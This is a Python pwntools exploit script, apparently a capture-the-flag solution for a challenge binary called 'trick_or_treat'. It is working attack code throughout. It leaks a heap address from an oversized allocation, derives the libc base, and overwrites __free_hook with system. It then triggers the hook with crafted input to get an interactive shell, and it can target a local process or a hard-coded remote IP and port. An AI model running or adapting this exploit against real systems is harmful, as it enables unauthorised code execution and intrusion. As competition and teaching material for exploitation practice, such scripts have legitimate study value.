from pwn import *
from fastlog import log

context.os = 'linux'
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

LIBC_PATH = '/lib/x86_64-linux-gnu/libc.so.6'
BIN_PATH = './trick_or_treat'

DEBUG_ON = True

libc = ELF(LIBC_PATH)
binary = ELF(BIN_PATH)

p = None

def debug(command=''):
    if DEBUG_ON:
        gdb.attach(p, command)
        raw_input()

def overwrite(offset, value):
    p.recvuntil('Offset & Value:\x00')
    p.sendline(str(hex(offset)) + ' ' + str(hex(value)))

def exploit():
    magic_size = 0x1000 * 0x1000
    p.recvuntil('Size:')
    p.sendline(str(magic_size))
    heap_addr = int(p.recvline().split('Magic:')[1].strip(), 16)
    info('heap_addr = ' + hex(heap_addr))
    libc_addr = magic_size + heap_addr + 0x1000 - 0x10
    info('libc_addr = ' + hex(libc_addr))
    # + 0xc30: malloc_hook
    free_hook = libc_addr + 0x3eb000 + 0x28e8
    info('free_hook = ' + hex(free_hook))
    index = (free_hook - heap_addr) / 8
    # All one_gadget are not useful.
    overwrite(index, libc_addr + 0x4f440) # system

    p.recvuntil('Offset & Value:\x00')
    p.sendline('c'*0x400 + ' ed')
    p.interactive()
    
if __name__ == '__main__':
    log.setLevel(log.DEBUG)

    if len(sys.argv) == 1:
        p = process(executable=BIN_PATH, argv=[BIN_PATH], env={'LD_PRELOAD': LIBC_PATH})
    else:
        p = remote('3.112.41.140', 56746)

    exploit()
